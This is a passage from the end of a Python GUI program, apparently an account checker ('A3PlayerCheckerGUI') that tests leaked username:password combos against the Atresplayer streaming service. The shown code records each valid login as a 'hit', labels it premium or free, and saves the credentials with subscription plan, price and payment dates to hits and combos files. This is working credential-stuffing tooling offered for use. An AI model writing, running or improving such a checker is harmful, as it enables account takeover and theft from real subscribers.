                prox_pago.append(hasta)

                line_cuota.append(f"{plan} {price} {cur} {period} - Renueva {hasta} ({state})")
            
            plan_type = "PREMIUM"
            color = "green"
            icon = "🎯"
        else:
            planes_list = ["FREE ACCOUNT"]
            line_cuota = ["Sin suscripción activa"]
            fechas_suscrito = ["N/A"]
            ult_pago = ["N/A"]
            prox_pago = ["N/A"]
            plan_type = "FREE"
            color = "cyan"
            icon = "🆓"

        # MOSTRAR HIT EN PANTALLA
        log_msg = f"{icon} HIT {plan_type}: {USER[:25]:<25} Plan: {', '.join(planes_list)}"
        self.root.after(0, lambda: self.log_message(log_msg, color))

        # GUARDAR EN ARCHIVO HITS (CÓDIGO ORIGINAL)
        output_file = os.path.join(HITS_DIR, "A3Player Hits.txt")
        try:
            with open(output_file, "a", encoding="utf-8") as o:
                o.write(f"═══════════════════════════════════════════════════\n")
                o.write(f"URL: https://www.atresplayer.com/login\n")
                o.write(f"COMBO: {combo}\n")
                o.write(f"PLANES: {' / '.join(planes_list)}\n")
                o.write(f"CUOTA: {' ; '.join(line_cuota)}\n")
                o.write(f"FECHA SUSCRITO: {' y '.join(fechas_suscrito)}\n")
                o.write(f"ÚLTIMO PAGO: {' y '.join(ult_pago)}\n")
                o.write(f"PRÓXIMOS PAGOS: {' y '.join(prox_pago)}\n")
                o.write(f"FECHA CHECK: {datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n")
                o.write(f"═══════════════════════════════════════════════════\n\n")
        except Exception as e:
            self.root.after(0, lambda: self.log_message(f"❌ Error guardando hit: {e}", "red"))

        # GUARDAR EN ARCHIVO COMBOS SIMPLES
        combo_output = os.path.join(HITS_COMBO_DIR, "A3Player Combos.txt")
        try:
            with open(combo_output, "a", encoding="utf-8") as o:
                o.write(f"{combo}\n")
        except Exception as e:
            self.root.after(0, lambda: self.log_message(f"❌ Error guardando combo: {e}", "red"))

        stats.update("HIT")
        return True

    def run(self):
        """Inicia la aplicación"""
        self.root.mainloop()

# Ejecutar la aplicación
if __name__ == "__main__":
    app = A3PlayerCheckerGUI()
    app.run()